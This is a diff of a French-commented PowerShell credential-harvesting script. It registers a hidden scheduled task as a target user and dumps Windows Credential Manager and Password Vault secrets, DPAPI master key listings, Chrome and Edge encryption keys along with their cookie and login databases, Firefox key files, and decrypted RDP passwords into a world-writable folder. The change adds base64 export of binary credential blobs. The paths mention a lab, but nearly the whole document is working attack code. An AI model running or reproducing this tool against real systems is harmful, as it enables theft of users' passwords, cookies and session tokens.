@@ -1,16 +1,16 @@
 # schtask-dpapi.ps1
 # Usage : .\schtask-dpapi.ps1 -TargetUser "LAB\victime" [-OutputDir "C:\Lab\harvest"] [-Timeout 15]
-
+ 
 param(
     [Parameter(Mandatory)][string]$TargetUser,
     [string]$OutputDir = "C:\Lab\harvest",
     [string]$TaskName = "MaTaskDpapi",
     [int]$Timeout = 15
 )
-
+ 
 New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
 icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
-
+ 
 foreach ($f in @(
     "dpapi.ps1",
     "dpapi-credman.log",
@@ -26,26 +26,26 @@ foreach ($f in @(
     New-Item -Path "$OutputDir\$f" -ItemType File -Force | Out-Null
     icacls "$OutputDir\$f" /grant "*S-1-1-0:(F)" | Out-Null
 }
-
+ 
 Write-Host "[*] Creating DPAPI harvest script..." -ForegroundColor Cyan
 @"
 `$outputDir = "$OutputDir"
-
+ 
 Add-Type -AssemblyName System.Security
-
+ 
 Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
-
+ 
 public class WinCred {
-
+ 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     public struct DATA_BLOB {
         public int cbData;
         public IntPtr pbData;
     }
-
+ 
     [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern bool CryptUnprotectData(
         ref DATA_BLOB pDataIn,
@@ -56,10 +56,10 @@ public class WinCred {
         int dwFlags,
         ref DATA_BLOB pDataOut
     );
-
+ 
     [DllImport("kernel32.dll")]
     public static extern IntPtr LocalFree(IntPtr hMem);
-
+ 
     public static byte[] DecryptRaw(byte[] data) {
         DATA_BLOB input = new DATA_BLOB();
         DATA_BLOB output = new DATA_BLOB();
@@ -78,7 +78,7 @@ public class WinCred {
             Marshal.FreeHGlobal(input.pbData);
         }
     }
-
+ 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     public struct CREDENTIAL {
         public int Flags;
@@ -94,53 +94,92 @@ public class WinCred {
         public string TargetAlias;
         public string UserName;
     }
-
+ 
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr credentials);
-
+ 
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern bool CredRead(string target, int type, int reservedFlag, out IntPtr credential);
-
+ 
     [DllImport("advapi32.dll")]
     public static extern void CredFree(IntPtr buffer);
-
+ 
     public static string DumpAll() {
         int count; IntPtr credPtr;
         StringBuilder sb = new StringBuilder();
         if (!CredEnumerate(null, 0, out count, out credPtr))
             return "CredEnumerate failed: " + Marshal.GetLastWin32Error();
-
+ 
         for (int i = 0; i < count; i++) {
             IntPtr curr = Marshal.ReadIntPtr(credPtr, i * IntPtr.Size);
             CREDENTIAL cred = (CREDENTIAL)Marshal.PtrToStructure(curr, typeof(CREDENTIAL));
-
-            string password = "";
-
+ 
+            byte[] rawBytes = null;
+            string textPassword = "";
+            bool isBinary = false;
+ 
+            // Extraire les bytes bruts du blob
             if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero) {
-                password = Marshal.PtrToStringUni(cred.CredentialBlob, cred.CredentialBlobSize / 2);
+                rawBytes = new byte[cred.CredentialBlobSize];
+                Marshal.Copy(cred.CredentialBlob, rawBytes, 0, cred.CredentialBlobSize);
+ 
+                // Tenter l interpretation Unicode
+                textPassword = Marshal.PtrToStringUni(cred.CredentialBlob, cred.CredentialBlobSize / 2);
+ 
+                // Detecter si c est du binaire (caracteres non-imprimables ASCII)
+                foreach (char c in textPassword) {
+                    if (c > 0x7E || (c < 0x20 && c != '\r' && c != '\n' && c != '\t')) {
+                        isBinary = true;
+                        break;
+                    }
+                }
             }
-
-            if (string.IsNullOrEmpty(password)) {
+ 
+            // Fallback CredRead si blob vide
+            if (rawBytes == null || rawBytes.Length == 0) {
                 IntPtr credReadPtr = IntPtr.Zero;
                 try {
                     if (CredRead(cred.TargetName, 1, 0, out credReadPtr)) {
                         CREDENTIAL cr = (CREDENTIAL)Marshal.PtrToStructure(credReadPtr, typeof(CREDENTIAL));
-                        if (cr.CredentialBlobSize > 0 && cr.CredentialBlob != IntPtr.Zero)
-                            password = Marshal.PtrToStringUni(cr.CredentialBlob, cr.CredentialBlobSize / 2);
+                        if (cr.CredentialBlobSize > 0 && cr.CredentialBlob != IntPtr.Zero) {
+                            rawBytes = new byte[cr.CredentialBlobSize];
+                            Marshal.Copy(cr.CredentialBlob, rawBytes, 0, cr.CredentialBlobSize);
+                            textPassword = Marshal.PtrToStringUni(cr.CredentialBlob, cr.CredentialBlobSize / 2);
+                            isBinary = false;
+                            foreach (char c in textPassword) {
+                                if (c > 0x7E || (c < 0x20 && c != '\r' && c != '\n' && c != '\t')) {
+                                    isBinary = true;
+                                    break;
+                                }
+                            }
+                        }
                     }
                 } catch {} finally {
                     if (credReadPtr != IntPtr.Zero) CredFree(credReadPtr);
                 }
             }
-
+ 
             sb.AppendLine("--- Entry " + (i+1) + " ---");
             sb.AppendLine("Type       : " + cred.Type + (cred.Type == 1 ? " (Generic)" : cred.Type == 2 ? " (Domain Password - requires LSASS)" : ""));
             sb.AppendLine("TargetName : " + cred.TargetName);
             sb.AppendLine("UserName   : " + cred.UserName);
-            if (cred.Type == 2)
+ 
+            if (cred.Type == 2) {
                 sb.AppendLine("Password   : [not accessible - Domain credential, requires LSASS]");
-            else
-                sb.AppendLine("Password   : " + (string.IsNullOrEmpty(password) ? "[empty]" : password));
+            } else if (rawBytes != null && rawBytes.Length > 0) {
+                if (isBinary) {
+                    // Blob binaire : base64 exploitable
+                    sb.AppendLine("BlobType   : BINARY");
+                    sb.AppendLine("BlobSize   : " + rawBytes.Length + " bytes");
+                    sb.AppendLine("BlobB64    : " + Convert.ToBase64String(rawBytes));
+                } else {
+                    // Texte lisible en clair
+                    sb.AppendLine("Password   : " + textPassword);
+                }
+            } else {
+                sb.AppendLine("Password   : [empty]");
+            }
+ 
             sb.AppendLine("Persist    : " + cred.Persist);
         }
         CredFree(credPtr);
@@ -148,7 +187,7 @@ public class WinCred {
     }
 }
 '@ -Language CSharp
-
+ 
 # ============================================================
 # 1. CREDENTIAL MANAGER (passwords en clair pour Generic Type 1)
 # ============================================================
@@ -158,7 +197,7 @@ try {
 } catch {
     "[ERROR] CredEnumerate failed : `$_" | Out-File "`$outputDir\dpapi-credman.log" -Append
 }
-
+ 
 # ============================================================
 # 2. WINDOWS PASSWORD VAULT (passwords en clair)
 # ============================================================
@@ -175,7 +214,7 @@ try {
 } catch {
     "[ERROR] PasswordVault failed : `$_" | Out-File "`$outputDir\dpapi-vault.log" -Append
 }
-
+ 
 # ============================================================
 # 3. MASTERKEYS - liste des fichiers de cles maitresses
 # ============================================================
@@ -189,7 +228,7 @@ if (Test-Path `$mkPath) {
 } else {
     "[WARN] MasterKeys path not found" | Out-File "`$outputDir\dpapi-masterkeys.log" -Append
 }
-
+ 
 # ============================================================
 # 4. CHROME - cle AES + bases de donnees
 # ============================================================
@@ -215,7 +254,7 @@ if (Test-Path `$chromeLS) {
 } else {
     "[WARN] Chrome Local State not found" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
 }
-
+ 
 `$chromeDefault = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 if (Test-Path `$chromeDefault) {
     foreach (`$db in @("Cookies", "Login Data", "History", "Web Data")) {
@@ -230,7 +269,7 @@ if (Test-Path `$chromeDefault) {
         try { Copy-Item `$networkCookies "`$outputDir\chrome-Network-Cookies.db" -Force -ErrorAction Stop; "[+] Chrome Network Cookies copied" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append } catch { "[WARN] Chrome Network Cookies locked : `$_" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append }
     }
 }
-
+ 
 # ============================================================
 # 5. EDGE - cle AES + bases de donnees
 # ============================================================
@@ -256,7 +295,7 @@ if (Test-Path `$edgeLS) {
 } else {
     "[WARN] Edge Local State not found" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append
 }
-
+ 
 `$edgeDefault = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 if (Test-Path `$edgeDefault) {
     foreach (`$db in @("Cookies", "Login Data", "History", "Web Data")) {
@@ -271,7 +310,7 @@ if (Test-Path `$edgeDefault) {
         try { Copy-Item `$networkCookies "`$outputDir\edge-Network-Cookies.db" -Force -ErrorAction Stop; "[+] Edge Network Cookies copied" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append } catch { "[WARN] Edge Network Cookies locked : `$_" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append }
     }
 }
-
+ 
 # ============================================================
 # 6. FIREFOX - fichiers cles + cookies (pas chiffres)
 # ============================================================
@@ -293,7 +332,7 @@ if (`$ffProfiles) {
 } else {
     "[WARN] No Firefox profile found" | Out-File "`$outputDir\dpapi-browser-firefox.log" -Append
 }
-
+ 
 # ============================================================
 # 7. RDP - fichiers .rdp + dechiffrement password 51:b:
 # ============================================================
@@ -305,7 +344,7 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
     if (`$rdpContent -match 'password 51:b:(.+)') {
         `$blob = `$Matches[1].Trim()
         `$decrypted = `$null
-
+ 
         if (-not `$decrypted -and `$blob -match '^[0-9A-Fa-f]+$' -and `$blob.Length % 2 -eq 0) {
             try {
                 `$bytes = New-Object byte[] (`$blob.Length / 2)
@@ -316,7 +355,7 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
                 if (`$decrypted) { "[+] RDP Password (hex-decoded) : `$([System.Text.Encoding]::Unicode.GetString(`$decrypted))" | Out-File "`$outputDir\dpapi-rdg.log" -Append }
             } catch {}
         }
-
+ 
         if (-not `$decrypted) {
             try {
                 `$bytes = [System.Convert]::FromBase64String(`$blob)
@@ -324,7 +363,7 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
                 if (`$decrypted) { "[+] RDP Password (base64-decoded) : `$([System.Text.Encoding]::Unicode.GetString(`$decrypted))" | Out-File "`$outputDir\dpapi-rdg.log" -Append }
             } catch {}
         }
-
+ 
         if (-not `$decrypted) {
             try {
                 `$bytes = [System.Text.Encoding]::Default.GetBytes(`$blob)
@@ -332,14 +371,14 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
                 if (`$decrypted) { "[+] RDP Password (raw) : `$([System.Text.Encoding]::Unicode.GetString(`$decrypted))" | Out-File "`$outputDir\dpapi-rdg.log" -Append }
             } catch {}
         }
-
+ 
         if (-not `$decrypted) {
             try {
                 `$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String(`$blob), `$null, 'CurrentUser')
                 if (`$decrypted) { "[+] RDP Password (ProtectedData) : `$([System.Text.Encoding]::Unicode.GetString(`$decrypted))" | Out-File "`$outputDir\dpapi-rdg.log" -Append }
             } catch {}
         }
-
+ 
         if (-not `$decrypted) {
             "[WARN] RDP password could not be decrypted (all methods failed)" | Out-File "`$outputDir\dpapi-rdg.log" -Append
         }
@@ -348,7 +387,7 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
 if ((Get-Item "`$outputDir\dpapi-rdg.log").Length -le 50) {
     "[WARN] No .rdp files found" | Out-File "`$outputDir\dpapi-rdg.log" -Append
 }
-
+ 
 # ============================================================
 # 8. DIVERS - Vault, Crypto, SystemCertificates
 # ============================================================
@@ -364,7 +403,7 @@ foreach (`$p in @("`$env:LOCALAPPDATA\Microsoft\Vault", "`$env:APPDATA\Microsoft
 }
 "@ | Set-Content -Path "$OutputDir\dpapi.ps1" -Encoding ASCII
 icacls "$OutputDir\dpapi.ps1" /grant "*S-1-1-0:(F)" | Out-Null
-
+ 
 Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 $settings  = New-ScheduledTaskSettingsSet -Hidden
@@ -372,10 +411,10 @@ $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoPro
 $principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
 Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
 Start-ScheduledTask -TaskName $TaskName
-
+ 
 Write-Host "[*] Waiting for execution (${Timeout}s)..." -ForegroundColor Cyan
 Start-Sleep -Seconds $Timeout
-
+ 
 $result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
 if ($result -eq 0) {
     Write-Host "[+] Success !" -ForegroundColor Green
@@ -394,6 +433,6 @@ if ($result -eq 0) {
 } else {
     Write-Host "[-] Failed (LastTaskResult: $result)" -ForegroundColor Red
 }
-
+ 
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 Write-Host "[*] Scheduled task deleted." -ForegroundColor Cyan
